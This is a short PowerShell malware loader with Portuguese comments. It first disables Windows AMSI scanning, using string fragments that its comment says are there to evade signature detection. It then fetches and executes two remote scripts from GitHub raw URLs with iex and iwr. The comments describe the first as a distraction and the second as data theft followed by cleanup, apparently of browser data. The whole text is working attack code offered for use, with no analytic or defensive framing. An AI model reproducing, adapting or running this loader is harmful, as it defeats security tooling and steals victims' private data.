# Desabilita o AMSI (ofuscado para evitar assinatura)
$t = [Ref].Assembly.GetType(('Sys'+'tem.Man'+'age'+'ment.A'+'utom'+'ation.A'+'ms'+'iUt'+'ils'))
$t.GetField(('am'+'siInitFai'+'led'), 'NonPublic,Static').SetValue($null, $true)

# Executa a distração
iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/ANDRE.ps1' -UseBasicParsing).Content

# Pequena pausa para a distração entrar em ação
Start-Sleep -Seconds 3

# Executa o roubo de dados + limpeza
iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/BROWSER-ALL.ps1' -UseBasicParsing).Content
